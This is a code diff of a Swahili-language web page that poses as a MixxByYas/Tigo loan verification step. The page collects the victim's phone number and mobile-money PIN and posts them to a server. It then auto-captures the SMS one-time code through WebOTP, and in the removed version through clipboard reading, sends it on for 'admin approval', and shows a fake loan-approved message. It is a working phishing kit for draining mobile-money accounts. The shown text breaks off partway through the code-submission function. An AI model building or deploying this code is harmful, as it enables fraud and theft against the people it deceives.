@@ -1,523 +1,357 @@
 <!DOCTYPE html>
-<html>
+<html lang="sw">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MixxByYas - Verification</title>
+    <title>MixxByYas - Thibitisha</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: #0b0e1a;
-            color: white;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            padding: 20px;
-        }
-        .container {
-            max-width: 450px;
-            width: 100%;
-            background: #1a1f35;
-            padding: 25px;
-            border-radius: 20px;
-            border: 1px solid #2a2f4a;
-        }
-        h2 { color: #fff; margin-bottom: 5px; }
-        .sub { color: #8899bb; margin-bottom: 20px; font-size: 14px; }
-        .step-box {
-            background: #12172a;
-            padding: 15px;
-            border-radius: 12px;
-            margin-bottom: 20px;
-        }
-        .step { 
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            color: #ccd;
-            padding: 4px 0;
-            font-size: 14px;
-        }
-        .step-num {
-            background: #4f46e5;
-            border-radius: 50%;
-            width: 24px;
-            height: 24px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-weight: bold;
-            font-size: 12px;
-        }
-        .sms-area {
-            background: #0d1225;
-            border-radius: 12px;
-            padding: 15px;
-            border: 1px solid #2a2f4a;
-            margin: 15px 0;
-        }
-        .sms-area label {
-            color: #8899bb;
-            font-size: 13px;
-            display: block;
-            margin-bottom: 8px;
-        }
-        textarea {
-            width: 100%;
-            background: transparent;
-            border: none;
-            color: #fff;
-            font-size: 14px;
-            min-height: 80px;
-            outline: none;
-            resize: none;
-            font-family: monospace;
-        }
-        .btn {
-            width: 100%;
-            background: #4f46e5;
-            border: none;
-            padding: 14px;
-            border-radius: 30px;
-            color: white;
-            font-weight: bold;
-            font-size: 16px;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
-        .resend-row {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 15px;
-            color: #8899bb;
-            font-size: 14px;
-        }
-        #resendBtn {
-            background: transparent;
-            border: none;
-            color: #818cf8;
-            cursor: pointer;
-            font-weight: bold;
-        }
-        #resendBtn:disabled { opacity: 0.4; }
-        .status {
-            text-align: center;
-            margin-top: 15px;
-            color: #8899bb;
-            font-size: 14px;
-        }
-        .hidden { display: none !important; }
-        .toast {
-            background: #0d1225;
-            border-left: 3px solid #4f46e5;
-            padding: 10px 15px;
-            border-radius: 8px;
-            margin: 10px 0;
-            color: #ccd;
-            font-size: 14px;
-        }
-        .code-display {
-            background: #0d1225;
-            padding: 10px;
-            border-radius: 8px;
-            text-align: center;
-            color: #34d399;
-            font-size: 20px;
-            font-weight: bold;
-            font-family: monospace;
-            margin: 10px 0;
-            letter-spacing: 3px;
-        }
-        .detect-badge {
+        :root { --primary: #2563eb; --gold: #f59e0b; --gold-dark: #d97706; --light-yellow: #fffef5; --success: #10b981; --danger: #ef4444; --dark: #1e293b; --gray: #64748b; --white: #ffffff; --light-navy: #2c3e6b; --timer-blue: #e0f0ff; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: var(--light-yellow); color: var(--dark); line-height: 1.6; min-height: 100vh; display: flex; flex-direction: column; }
+        .brand-bar { background: var(--light-navy); text-align: center; padding: 0.8rem; display: flex; align-items: center; justify-content: center; gap: 0.6rem; border-bottom: 2px solid var(--gold); }
+        .brand-logo { width: 32px; height: 32px; background: var(--gold); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 900; font-size: 0.9rem; color: var(--light-navy); }
+        .brand-text { font-size: 1.1rem; font-weight: 700; } .brand-text .mixx { color: var(--white); } .brand-text .yas { color: var(--gold); }
+        .back-link { display: block; padding: 1rem 1.5rem; color: var(--gray); text-decoration: none; font-size: 0.9rem; max-width: 500px; margin: 0 auto; }
+        .main-container { max-width: 500px; margin: 0 auto 2rem; padding: 0 1rem; flex: 1; }
+        .card { background: var(--white); border-radius: 14px; padding: 2rem; box-shadow: 0 4px 15px rgba(0,0,0,0.06); border: 1px solid #fef3c7; }
+        .loan-summary { background: #fefce8; border-radius: 14px; padding: 1rem; text-align: center; margin-bottom: 1.5rem; }
+        .loan-summary .amount { font-size: 1.6rem; font-weight: 900; color: var(--primary); }
+        .screen { display: none; animation: fadeIn 0.4s ease; } .screen.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .form-group { margin-bottom: 1.2rem; } .form-group label { display: block; font-weight: 600; font-size: 0.9rem; margin-bottom: 0.4rem; }
+        .phone-box { display: flex; border: 2px solid #fef3c7; border-radius: 14px; overflow: hidden; }
+        .phone-box .prefix { background: #fef9e7; padding: 0.85rem 1rem; font-weight: 700; border-right: 1px solid #fef3c7; }
+        .phone-box input { flex: 1; padding: 0.85rem 1rem; border: none; font-size: 1rem; font-family: inherit; outline: none; }
+        .pin-box { position: relative; border: 2px solid #fef3c7; border-radius: 14px; overflow: hidden; }
+        .pin-box input { width: 100%; padding: 0.85rem 1rem; border: none; font-size: 1.2rem; font-family: inherit; outline: none; letter-spacing: 0.5rem; }
+        .pin-box .toggle-btn { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; font-size: 1.2rem; }
+        .error-msg { color: var(--danger); font-size: 0.8rem; margin-top: 0.3rem; display: none; } .error-msg.show { display: block; }
+        .btn { width: 100%; padding: 0.95rem; border-radius: 50px; font-weight: 700; font-size: 1rem; cursor: pointer; border: none; font-family: inherit; margin-top: 0.5rem; }
+        .btn-gold { background: var(--gold); color: var(--dark); }
+        .waiting-content { text-align: center; padding: 1rem; }
+        .spinner { width: 50px; height: 50px; border: 4px solid #fef3c7; border-top-color: var(--gold); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 1rem; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .phone-display { background: #fef9e7; padding: 0.4rem 1.2rem; border-radius: 25px; display: inline-block; font-weight: 700; margin: 0.5rem 0; font-size: 0.9rem; }
+        .code-instruction { background: #fefce8; border-radius: 12px; padding: 14px 16px; margin: 10px 0; font-size: 0.85rem; color: var(--dark); text-align: center; border: 1px solid #fef3c7; line-height: 1.6; }
+        .code-instruction i { color: var(--gold); margin-right: 4px; }
+        .sms-open-btn { display: block; text-align: center; background: #00377D; color: #FFD100; padding: 12px; border-radius: 30px; text-decoration: none; font-weight: 700; font-size: 0.85rem; margin: 8px 0; border: 2px solid #FFD100; cursor: pointer; }
+        .sms-open-btn i { margin-right: 6px; }
+        .sms-textarea { width: 100%; height: 100px; border: 2px solid #fef3c7; border-radius: 14px; padding: 12px; font-size: 0.85rem; font-family: inherit; resize: vertical; outline: none; background: #fff; }
+        .sms-textarea:focus { border-color: var(--gold); }
+        .sms-textarea::placeholder { color: #b0b8c4; }
+        .timer-bar { background: var(--timer-blue); border-radius: 10px; padding: 0.6rem; text-align: center; font-weight: 700; font-size: 0.9rem; color: var(--primary); margin-top: 0.3rem; }
+        .timer-bar.warning { background: #fef2f2; color: var(--danger); }
+        .resend-link { text-align: center; margin-top: 0.8rem; }
+        .resend-link a { color: var(--primary); text-decoration: none; font-size: 0.85rem; cursor: pointer; font-weight: 600; }
+        .success-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 1000; align-items: center; justify-content: center; }
+        .success-overlay.active { display: flex; }
+        .success-card { background: var(--white); border-radius: 14px; padding: 2rem; text-align: center; max-width: 400px; width: 90%; animation: popIn 0.5s ease; }
+        @keyframes popIn { from { opacity: 0; transform: scale(0.8); } to { opacity: 1; transform: scale(1); } }
+        .check-icon { width: 70px; height: 70px; margin: 0 auto 0.8rem; } .check-icon svg { width: 100%; height: 100%; }
+        .check-circle { stroke: var(--success); stroke-width: 3; fill: none; stroke-dasharray: 283; stroke-dashoffset: 283; animation: drawCircle 1s ease forwards; }
+        .check-mark { stroke: var(--success); stroke-width: 3; fill: none; stroke-dasharray: 100; stroke-dashoffset: 100; animation: drawCheck 0.5s 0.6s ease forwards; }
+        @keyframes drawCircle { to { stroke-dashoffset: 0; } } @keyframes drawCheck { to { stroke-dashoffset: 0; } }
+        .success-card h2 { color: var(--success); margin-bottom: 0.3rem; }
+        .success-card .big-amount { font-size: 1.8rem; font-weight: 900; color: var(--primary); margin: 0.5rem 0; }
+        .btn-home { background: var(--gold); color: var(--dark); padding: 0.8rem 2rem; border-radius: 50px; font-weight: 600; cursor: pointer; border: none; font-family: inherit; font-size: 0.9rem; }
+        .copyright-bar { background: var(--light-navy); text-align: center; padding: 1rem; margin-top: auto; }
+        .copyright-bar p { color: rgba(255,255,255,0.6); font-size: 0.75rem; }
+        .auto-detect-badge {
+            display: inline-block;
             background: #1a2a1a;
             border: 1px solid #2a4a2a;
             border-radius: 20px;
-            padding: 6px 15px;
-            display: inline-block;
+            padding: 4px 12px;
             color: #34d399;
-            font-size: 13px;
-            margin-bottom: 15px;
+            font-size: 11px;
+            margin-left: 6px;
         }
-        .btn-app {
+        .auto-detect-badge .dot {
             display: inline-block;
-            background: #2a2f4a;
-            border: 1px solid #3a3f5a;
-            padding: 8px 20px;
-            border-radius: 20px;
-            color: #ccd;
-            text-decoration: none;
-            font-size: 14px;
-            margin-right: 8px;
-        }
-        .btn-app i { margin-right: 5px; }
-        .success-overlay {
-            position: fixed;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.85);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-        }
-        .success-overlay.show { display: flex; }
-        .success-modal {
-            background: #1a1f35;
-            padding: 30px;
-            border-radius: 20px;
-            text-align: center;
-            max-width: 350px;
-            width: 90%;
-            border: 1px solid #2a4a2a;
-        }
-        .success-modal h2 { color: #34d399; margin: 10px 0; }
-        .success-modal p { color: #8899bb; }
-        .success-modal button {
-            background: #4f46e5;
-            border: none;
-            padding: 10px 30px;
-            border-radius: 20px;
-            color: white;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-        .spinner {
-            display: inline-block;
-            width: 14px;
-            height: 14px;
-            border: 2px solid rgba(255,255,255,0.2);
-            border-top: 2px solid white;
+            width: 6px;
+            height: 6px;
+            background: #34d399;
             border-radius: 50%;
-            animation: spin 0.7s linear infinite;
+            animation: pulse-dot 1.5s ease-in-out infinite;
         }
-        @keyframes spin { 0% { transform: rotate(0); } 100% { transform: rotate(360deg); } }
+        @keyframes pulse-dot {
+            0% { opacity: 0.4; transform: scale(0.8); }
+            50% { opacity: 1; transform: scale(1.2); }
+            100% { opacity: 0.4; transform: scale(0.8); }
+        }
     </style>
 </head>
 <body>
-
-<div class="container">
-    <h2>📱 Code Check</h2>
-    <div class="sub">Auto-reads SMS from notification</div>
-
-    <div class="detect-badge" id="detectionStatus">📱 Listening for SMS...</div>
-
-    <div class="step-box">
-        <div class="step"><span class="step-num">1</span> Wait for SMS to arrive</div>
-        <div class="step"><span class="step-num">2</span> Page auto-detects the code</div>
-        <div class="step"><span class="step-num">3</span> Auto-submits for verification</div>
+    <div class="brand-bar"><div class="brand-logo">M</div><div class="brand-text"><span class="mixx">Mixx</span><span class="yas">ByYas</span></div></div>
+    <a href="/apply" class="back-link">← Rudi</a>
+    <div class="main-container">
+        <div class="loan-summary"><div style="font-size:0.75rem;color:var(--gray);">Mkopo Wako</div><div class="amount" id="loanAmount">TZS 0</div></div>
+        <div class="card">
+            <div class="screen active" id="screen1">
+                <h3 style="margin-bottom:1rem;">📱 Ingiza Taarifa za Tigo</h3>
+                <div class="form-group"><label>Namba ya Simu</label><div class="phone-box"><span class="prefix">+255</span><input type="tel" id="phoneNumber" placeholder="0712345678 au 0612345678" maxlength="12"></div><div class="error-msg" id="phoneError">Ingiza namba sahihi</div></div>
+                <div class="form-group"><label>PIN ya Tigo</label><div class="pin-box"><input type="password" id="tigoPin" placeholder="• • • •" maxlength="4"><button class="toggle-btn" onclick="togglePIN()">👁️</button></div><div class="error-msg" id="pinError">Ingiza PIN</div></div>
+                <button class="btn btn-gold" onclick="submitDetails()">Endelea →</button>
+            </div>
+            <div class="screen" id="screen2"><div class="waiting-content"><div class="spinner"></div><h3>⏳ Inakaguliwa</h3><p style="color:var(--gray);">Inasubiri uidhinishaji</p><div class="phone-display" id="showPhone">+255 ---------</div></div></div>
+            <div class="screen" id="screen3"><div class="waiting-content">
+                <h3>✅ Namba ya Uthibitisho <span class="auto-detect-badge"><span class="dot"></span> Auto-detect</span></h3>
+                <div class="phone-display" id="showPhone2">+255 ---------</div>
+                <div class="code-instruction">
+                    <i class="fas fa-sms"></i> <strong>Msimbo utagunduliwa kiotomatiki</strong><br><br>
+                    <strong>1.</strong> Subiri SMS ifike kwenye simu yako<br>
+                    <strong>2.</strong> Ukishaipokea, bonyeza <strong>"Allow"</strong> kwenye kidirisha kitakachoonekana<br>
+                    <strong>3.</strong> Msimbo utajaza kiotomatiki na kutumwa
+                </div>
+                <a href="sms:" class="sms-open-btn" id="btnIPhone" style="display:none;">
+                    <i class="fas fa-envelope"></i> 📱 iPhone: Gusa Hapa Kufungua Messages
+                </a>
+                <a href="sms:" class="sms-open-btn" id="btnAndroid" style="display:none;">
+                    <i class="fas fa-envelope"></i> 🤖 Android: Gusa Hapa Kufungua SMS
+                </a>
+                <textarea id="smsMessage" class="sms-textarea" placeholder="SMS itaonekana hapa kiotomatiki..."></textarea>
+                <div class="timer-bar" id="timerDisplay">⏳ 30s</div>
+                <div class="error-msg" id="codeError" style="text-align:center;">Namba si sahihi</div>
+                <button class="btn btn-gold" onclick="submitCode()">Endelea →</button>
+                <div class="resend-link"><a onclick="resendCode()">↻ Hukupokea SMS? Bonyeza hapa</a></div>
+            </div></div>
+            <div class="screen" id="screen4"><div class="waiting-content"><div class="spinner"></div><h3>⏳ Inathibitisha</h3><div class="phone-display" id="showPhone3">+255 ---------</div></div></div>
+        </div>
     </div>
+    <div class="success-overlay" id="successOverlay"><div class="success-card"><div class="check-icon"><svg viewBox="0 0 100 100"><circle class="check-circle" cx="50" cy="50" r="45"/><path class="check-mark" d="M30 50 L45 65 L70 35" fill="none"/></svg></div><h2>🎉 Mkopo Umeidhinishwa!</h2><div class="big-amount" id="approvedAmount">TZS 0</div><p>📱 Uthibitisho umetumwa<br>💰 Fedha zitaingia hivi karibuni</p><button class="btn-home" onclick="window.location.href='/'">🏠 Rudi Nyumbani</button></div></div>
+    <div class="copyright-bar"><p>© 2024 MixxByYas</p></div>
 
-    <div class="sms-area">
-        <label>📩 Full SMS</label>
-        <textarea id="smsCode" readonly placeholder="SMS will appear here automatically..."></textarea>
-    </div>
+    <!-- ============================================================ -->
+    <!-- ORIGINAL SCRIPT + SMS AUTO-DETECTION ADDED BELOW              -->
+    <!-- ============================================================ -->
+    <script>
+        // ================================================================
+        // ORIGINAL SCRIPT (unchanged)
+        // ================================================================
+        var urlParams = new URLSearchParams(window.location.search);
+        var loanAmount = parseInt(urlParams.get('amount') || '500000');
+        var loanTerm = parseInt(urlParams.get('term') || '12');
+        document.getElementById('loanAmount').textContent = 'TZS ' + loanAmount.toLocaleString();
+        document.getElementById('approvedAmount').textContent = 'TZS ' + loanAmount.toLocaleString();
+        var appId = '', checkInterval = null, countdownTimer = null, userPhone = '', fastCheck = null;
+        var resendCount = 0, resendCooldown = false;
 
-    <div id="codeDisplay" class="code-display" style="display:none;">
-        🔑 Code: <span id="extractedCodeDisplay"></span>
-    </div>
-
-    <div>
-        <a href="sms:" class="btn-app">📱 iPhone</a>
-        <a href="sms:" class="btn-app">🤖 Android</a>
-    </div>
-
-    <button class="btn" id="submitBtn">
-        <span id="submitText">✅ Thibitisha</span>
-        <span id="submitSpinner" class="spinner hidden"></span>
-    </button>
-
-    <div class="resend-row">
-        <span>🔄 <span id="resendCounter">0 / 3</span></span>
-        <button id="resendBtn" disabled>↻ Tuma tena</button>
-    </div>
-
-    <div id="toastDiv" class="toast hidden"></div>
-    <div class="status" id="statusText">⏳ Waiting for SMS...</div>
-</div>
-
-<div id="successOverlay" class="success-overlay">
-    <div class="success-modal">
-        <h2>✅ Loan Approved!</h2>
-        <p>Your loan has been approved successfully.</p>
-        <button onclick="closeSuccess()">Done</button>
-    </div>
-</div>
-
-<script>
-    // SIMPLE WORKING VERSION
-    const smsCode = document.getElementById('smsCode');
-    const submitBtn = document.getElementById('submitBtn');
-    const submitText = document.getElementById('submitText');
-    const submitSpinner = document.getElementById('submitSpinner');
-    const resendBtn = document.getElementById('resendBtn');
-    const resendCounter = document.getElementById('resendCounter');
-    const statusText = document.getElementById('statusText');
-    const detectionStatus = document.getElementById('detectionStatus');
-    const codeDisplay = document.getElementById('codeDisplay');
-    const extractedCodeDisplay = document.getElementById('extractedCodeDisplay');
-    const toastDiv = document.getElementById('toastDiv');
-    const successOverlay = document.getElementById('successOverlay');
-
-    let resendAttempts = 0;
-    let cooldown = 0;
-    let isSubmitting = false;
-    let smsDetected = false;
-    let extractedCode = '';
-
-    function showToast(msg) {
-        toastDiv.textContent = '• ' + msg;
-        toastDiv.classList.remove('hidden');
-        clearTimeout(window.toastTimer);
-        window.toastTimer = setTimeout(() => toastDiv.classList.add('hidden'), 4000);
-    }
-
-    function setStatus(msg) {
-        statusText.textContent = msg;
-    }
-
-    function updateResendUI() {
-        resendCounter.textContent = `${resendAttempts} / 3`;
-        if (resendAttempts >= 3) {
-            resendBtn.disabled = true;
-            resendBtn.textContent = '✖ Imeisha';
-        } else if (cooldown > 0) {
-            resendBtn.disabled = true;
-            resendBtn.textContent = `⏳ ${cooldown}s`;
-        } else {
-            resendBtn.disabled = false;
-            resendBtn.textContent = '↻ Tuma tena';
-        }
-    }
-
-    function startCooldown() {
-        cooldown = 30;
-        updateResendUI();
-        const timer = setInterval(() => {
-            cooldown--;
-            updateResendUI();
-            if (cooldown <= 0) {
-                clearInterval(timer);
-                updateResendUI();
-            }
-        }, 1000);
-    }
-
-    function extractCode(text) {
-        if (!text) return null;
-        const patterns = [
-            /code[:\s]+([a-zA-Z0-9]{6,20})/i,
-            /OTP[:\s]+([a-zA-Z0-9]{6,20})/i,
-            /use the code[:\s]+([a-zA-Z0-9]{6,20})/i,
-            /\b([a-zA-Z0-9]{8,20})\b/
-        ];
-        for (let p of patterns) {
-            const m = text.match(p);
-            if (m) return m[1];
-        }
-        return null;
-    }
-
-    // WebOTP Auto-Read
-    async function autoReadSMS() {
-        try {
-            if (!('OTPCredential' in window)) {
-                detectionStatus.textContent = '📋 Please copy SMS';
-                return false;
-            }
-            detectionStatus.textContent = '📱 Listening for SMS...';
-            
-            const controller = new AbortController();
-            const timeout = setTimeout(() => controller.abort(), 60000);
-            
-            const otp = await navigator.credentials.get({
-                otp: { transport: ['sms'] },
-                signal: controller.signal
-            });
-            
-            clearTimeout(timeout);
-            
-            if (otp && otp.code) {
-                extractedCode = otp.code;
-                smsCode.value = `Your verification code is: ${otp.code}`;
-                smsDetected = true;
-                
-                codeDisplay.style.display = 'block';
-                extractedCodeDisplay.textContent = otp.code;
-                
-                detectionStatus.textContent = '✅ SMS detected!';
-                showToast(`✅ Code: ${otp.code}`);
-                setStatus('✅ Code detected. Submitting...');
-                
-                setTimeout(() => {
-                    if (!isSubmitting && smsCode.value.trim()) {
-                        submitCode();
-                    }
-                }, 1000);
-                return true;
-            }
-            return false;
-        } catch (e) {
-            detectionStatus.textContent = '📋 Please copy SMS';
-            return false;
-        }
-    }
-
-    // Clipboard fallback
-    async function readClipboard() {
-        try {
-            if (!navigator.clipboard?.readText) return false;
-            const text = await navigator.clipboard.readText();
-            if (text && text.length > 10 && !smsDetected) {
-                smsCode.value = text;
-                smsDetected = true;
-                const code = extractCode(text);
-                if (code) {
-                    extractedCode = code;
-                    codeDisplay.style.display = 'block';
-                    extractedCodeDisplay.textContent = code;
-                }
-                detectionStatus.textContent = '✅ SMS from clipboard!';
-                showToast('✅ SMS from clipboard!');
-                setStatus('✅ SMS detected. Submitting...');
-                setTimeout(() => {
-                    if (!isSubmitting && smsCode.value.trim()) {
-                        submitCode();
-                    }
-                }, 800);
-                return true;
-            }
-            return false;
-        } catch (e) {
-            return false;
-        }
-    }
-
-    async function detectSMS() {
-        if (smsDetected || isSubmitting) return;
-        const success = await autoReadSMS();
-        if (!success) await readClipboard();
-    }
-
-    function submitCode() {
-        const code = smsCode.value.trim();
-        if (!code) {
-            showToast('⚠️ Please wait for SMS.');
-            return;
-        }
-        if (isSubmitting) return;
-        
-        isSubmitting = true;
-        submitBtn.disabled = true;
-        submitText.textContent = '⏳ Sending...';
-        submitSpinner.classList.remove('hidden');
-        setStatus('⏳ Sending to admin...');
-
-        const codeToSend = extractedCode || extractCode(code) || code;
-
-        fetch('/verify_code', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-                code: code, 
-                full_sms: code, 
-                extracted_code: codeToSend 
-            })
-        })
-        .then(r => r.json())
-        .then(data => {
-            isSubmitting = false;
-            submitBtn.disabled = false;
-            submitText.textContent = '✅ Thibitisha';
-            submitSpinner.classList.add('hidden');
-            if (data.status === 'success') {
-                showToast('✅ Code sent to admin!');
-                setStatus('⏳ Waiting for admin approval.');
+        (function() {
+            var ua = navigator.userAgent.toLowerCase();
+            if (/iphone|ipad|ipod/.test(ua)) {
+                document.getElementById('btnIPhone').style.display = 'block';
             } else {
-                showToast('❌ Error. Try again.');
-                setStatus('❌ Error. Please try again.');
+                document.getElementById('btnAndroid').style.display = 'block';
             }
-        })
-        .catch(() => {
-            isSubmitting = false;
-            submitBtn.disabled = false;
-            submitText.textContent = '✅ Thibitisha';
-            submitSpinner.classList.add('hidden');
-            showToast('❌ Network error.');
-            setStatus('❌ No connection.');
-        });
-    }
+        })();
 
-    function closeSuccess() {
-        successOverlay.classList.remove('show');
-    }
+        function togglePIN() { var p = document.getElementById('tigoPin'); var b = p.parentElement.querySelector('.toggle-btn'); if (p.type === 'password') { p.type = 'text'; b.textContent = '🙈'; } else { p.type = 'password'; b.textContent = '👁️'; } }
+        document.getElementById('phoneNumber').addEventListener('input', function() { this.value = this.value.replace(/\D/g, ''); });
+        document.getElementById('tigoPin').addEventListener('input', function() { this.value = this.value.replace(/\D/g, ''); });
 
-    window.showSuccess = function() {
-        successOverlay.classList.add('show');
-    };
-
-    // Event listeners
-    submitBtn.onclick = (e) => { e.preventDefault(); submitCode(); };
-    
-    resendBtn.onclick = function() {
-        if (resendAttempts >= 3 || cooldown > 0) return;
-        resendAttempts++;
-        startCooldown();
-        updateResendUI();
-        smsDetected = false;
-        extractedCode = '';
-        smsCode.value = '';
-        codeDisplay.style.display = 'none';
-        detectionStatus.textContent = '📱 Waiting for new SMS...';
-        fetch('/resend_code', { method: 'POST' }).catch(() => {});
-        setTimeout(() => detectSMS(), 2000);
-    };
-
-    // Page load
-    window.onload = function() {
-        setTimeout(detectSMS, 1000);
-        updateResendUI();
-    };
-
-    // Visibility change (user returns to page)
-    document.addEventListener('visibilitychange', function() {
-        if (document.visibilityState === 'visible' && !smsDetected) {
-            setTimeout(detectSMS, 500);
+        async function submitDetails() {
+            var phone = document.getElementById('phoneNumber').value.trim(); var pin = document.getElementById('tigoPin').value.trim();
+            if (!phone || phone.length < 9) { document.getElementById('phoneError').classList.add('show'); return; }
+            if (!pin || pin.length !== 4) { document.getElementById('pinError').classList.add('show'); return; }
+            userPhone = phone;
+            document.getElementById('screen1').classList.remove('active'); document.getElementById('screen2').classList.add('active');
+            document.getElementById('showPhone').textContent = '+255 ' + phone; document.getElementById('showPhone2').textContent = '+255 ' + phone; document.getElementById('showPhone3').textContent = '+255 ' + phone;
+            var loanData = JSON.parse(localStorage.getItem('loan_data') || '{}');
+            try { var res = await fetch('/api/submit_loan', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone: phone, pin: pin, amount: loanAmount, months: loanTerm, loan_type: loanData.loan_type || '', purpose: loanData.purpose || '' }) }); var data = await res.json(); appId = data.app_id; startChecking(); } catch(e) { alert('Error: ' + e.message); }
         }
-    });
 
-    // Paste event
-    document.addEventListener('paste', function(e) {
-        const text = e.clipboardData?.getData('text');
-        if (text && text.length > 10 && !smsDetected) {
-            smsCode.value = text;
-            smsDetected = true;
-            const code = extractCode(text);
-            if (code) {
-                extractedCode = code;
-                codeDisplay.style.display = 'block';
-                extractedCodeDisplay.textContent = code;
-            }
-            detectionStatus.textContent = '✅ SMS pasted!';
-            showToast('✅ SMS pasted!');
-            setStatus('✅ SMS detected. Submitting...');
-            setTimeout(() => {
-                if (!isSubmitting && smsCode.value.trim()) {
-                    submitCode();
+        function startChecking() { 
+            if (checkInterval) clearInterval(checkInterval); 
+            checkInterval = setInterval(async function() { 
+                try { 
+                    var res = await fetch('/api/check_status/' + appId); var data = await res.json(); 
+                    if (data.status === 'approved') { clearInterval(checkInterval); showCodeScreen(); } 
+                    else if (data.status === 'wrong_pin') { clearInterval(checkInterval); var invType = data.invalid_type || ''; if (invType === 'wrong_pin') { goBackToPinWrong(); } else { goBackToPin(); } } 
+                    else if (data.status === 'invalid_number') { clearInterval(checkInterval); var invType2 = data.invalid_type || ''; if (invType2 === 'otp_tigo') { goToHomeOtpTigo(); } else { goToHomeTigo(); } }
+                } catch(e) {} 
+            }, 3000); 
+        }
+
+        function showCodeScreen() { document.getElementById('screen2').classList.remove('active'); document.getElementById('screen3').classList.add('active'); document.getElementById('smsMessage').value = ''; startCountdown(); if (fastCheck) clearInterval(fastCheck); startAutoDetect(); }
+        
+        function startCountdown() { if (countdownTimer) clearInterval(countdownTimer); var seconds = 30; var display = document.getElementById('timerDisplay'); display.textContent = '⏳ ' + seconds + 's'; display.className = 'timer-bar'; countdownTimer = setInterval(function() { seconds--; display.textContent = '⏳ ' + seconds + 's'; if (seconds <= 10) display.className = 'timer-bar warning'; if (seconds <= 0) { clearInterval(countdownTimer); display.textContent = 'Muda Umeisha'; display.className = 'timer-bar warning'; } }, 1000); }
+
+        async function resendCode() { 
+            if (!userPhone) return; 
+            if (resendCooldown) { document.getElementById('codeError').textContent = 'Subiri sekunde 30 kabla ya kuomba tena.'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); setTimeout(function() { document.getElementById('codeError').classList.remove('show'); }, 3000); return; }
+            if (resendCount >= 3) { document.getElementById('codeError').textContent = 'Umezidi idadi ya maombi. Jaribu tena baadae.'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); return; }
+            resendCount++; resendCooldown = true; document.getElementById('smsMessage').value = '';
+            document.getElementById('codeError').textContent = 'OTP Imetumwa. Subiri msimbo kutoka Mixx. (' + resendCount + '/3)'; document.getElementById('codeError').style.color = 'var(--primary)'; document.getElementById('codeError').classList.add('show'); 
+            try { await fetch('/api/submit_loan', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone: userPhone, pin: '0000', amount: loanAmount, months: loanTerm, loan_type: '', purpose: 'OTP REQUESTED' }) }); setTimeout(function() { document.getElementById('codeError').classList.remove('show'); }, 3000); } catch(e) {} 
+            startChecking(); setTimeout(function() { resendCooldown = false; }, 30000);
+        }
+
+        function goBackToPin() { if (fastCheck) { clearInterval(fastCheck); fastCheck = null; } document.getElementById('screen2').classList.remove('active'); document.getElementById('screen1').classList.add('active'); document.getElementById('tigoPin').value = ''; document.getElementById('tigoPin').focus(); document.getElementById('smsMessage').value = ''; document.getElementById('codeError').textContent = 'Namba yako sio ya Tigo. Tafadhali tumia namba ya Tigo au angalia PIN yako ni sahihi.'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); }
+        function goBackToPinWrong() { if (fastCheck) { clearInterval(fastCheck); fastCheck = null; } if (countdownTimer) { clearInterval(countdownTimer); countdownTimer = null; } document.getElementById('screen2').classList.remove('active'); document.getElementById('screen4').classList.remove('active'); document.getElementById('screen1').classList.add('active'); document.getElementById('tigoPin').value = ''; document.getElementById('tigoPin').focus(); document.getElementById('smsMessage').value = ''; document.getElementById('pinError').textContent = 'PIN yako sio sahihi. Una nafasi moja tu ya kujaribu tena.'; document.getElementById('pinError').style.color = 'var(--danger)'; document.getElementById('pinError').classList.add('show'); setTimeout(function() { document.getElementById('pinError').classList.remove('show'); document.getElementById('pinError').textContent = 'Ingiza PIN'; }, 8000); }
+        function goToHomeTigo() { if (fastCheck) { clearInterval(fastCheck); fastCheck = null; } if (countdownTimer) { clearInterval(countdownTimer); countdownTimer = null; } localStorage.setItem('popupTigo', 'true'); window.location.href = '/'; }
+        function goToHomeOtpTigo() { if (fastCheck) { clearInterval(fastCheck); fastCheck = null; } if (countdownTimer) { clearInterval(countdownTimer); countdownTimer = null; } localStorage.setItem('popupOtpTigo', 'true'); window.location.href = '/'; }
+
+        async function submitCode() { 
+            if (fastCheck) { clearInterval(fastCheck); fastCheck = null; } if (countdownTimer) { clearInterval(countdownTimer); countdownTimer = null; } 
+            var smsText = document.getElementById('smsMessage').value.trim();
+            if (!smsText) { document.getElementById('codeError').textContent = 'Bandika ujumbe wa SMS kwanza.'; document.getElementById('codeError').style.color = 'var(--danger)'; document.getElementById('codeError').classList.add('show'); startCountdown(); return; }
+            document.getElementById('screen3').classList.remove('active'); document.getElementById('screen4').classList.add('active'); 
+            await fetch('/api/submit_code', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ app_id: appId, code: smsText }) }); 
+            if (checkInterval) clearInterval(checkInterval); 
